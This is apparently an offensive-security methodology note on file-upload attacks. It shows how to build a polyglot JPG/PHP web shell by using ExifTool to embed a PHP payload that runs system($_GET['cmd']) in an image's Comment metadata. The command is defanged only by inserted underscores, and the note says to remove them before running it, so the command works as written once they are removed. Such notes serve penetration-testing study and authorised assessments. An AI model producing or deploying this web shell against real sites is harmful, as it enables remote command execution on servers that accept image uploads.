> [!NOTE] Windows Defender Antivirus (AV) triggers on `.md` (Markdown) files, often flagging them as potential threats. As a result, the commands provided below have been defanged to avoid false positives. Kindly remove the `p_h_p` and `c_m_d` before executing them.
### A polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows: 

`exiftool -Comment='<?p_h_p echo "<pre>"; system($_GET['c_m_d']); ?>' /home/kali/Downloads/door.jpg -o polyglot.p_h_p`

![[docs/Attachments/Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/File upload/Polyglot web shell/{{notename}}-202605011506.png]]